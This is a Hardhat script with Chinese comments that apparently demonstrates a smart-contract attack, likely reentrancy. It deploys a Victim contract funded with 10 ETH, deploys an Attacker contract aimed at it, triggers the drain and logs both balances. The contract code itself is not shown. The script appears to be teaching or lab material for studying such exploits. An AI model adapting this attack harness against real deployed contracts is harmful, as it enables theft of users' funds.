const { ethers } = require("hardhat");

async function main() {
    // 部署 Victim 合约
    const Victim = await ethers.getContractFactory("Victim");
    const victim = await Victim.deploy();
    await victim.waitForDeployment();
    console.log("Victim contract deployed to:", await victim.getAddress());

    // 存款 10 ETH 到 Victim 合约
    const depositTx = await victim.deposit({ value: ethers.parseEther("10") });
    await depositTx.wait();
    console.log("victim Deposit of 10 ETH successful!");

    // 部署 Attacker 合约
    const Attacker = await ethers.getContractFactory("Attacker");
    const attacker = await Attacker.deploy(await victim.getAddress());
    await attacker.waitForDeployment();
    console.log("Attacker contract deployed to:", await attacker.getAddress());

    const depositTx1 = await attacker.deposit({ value: ethers.parseEther("1") });
    await depositTx1.wait();
    console.log("attacker Deposit of 1 ETH successful!");

    // 攻击 Victim 合约
    const attackTx = await attacker.withdraw();
    await attackTx.wait();
    console.log("Attack successful!");

    // 检查 Victim 合约的余额
    const victimBalance = await ethers.provider.getBalance(await victim.getAddress());
    console.log("Victim contract balance after attack:", ethers.formatEther(victimBalance));

    // 检查 Attacker 合约的余额
    const attackerBalance = await ethers.provider.getBalance(await attacker.getAddress());
    console.log("Attacker contract balance after attack:", ethers.formatEther(attackerBalance));
}

main().catch(console.error)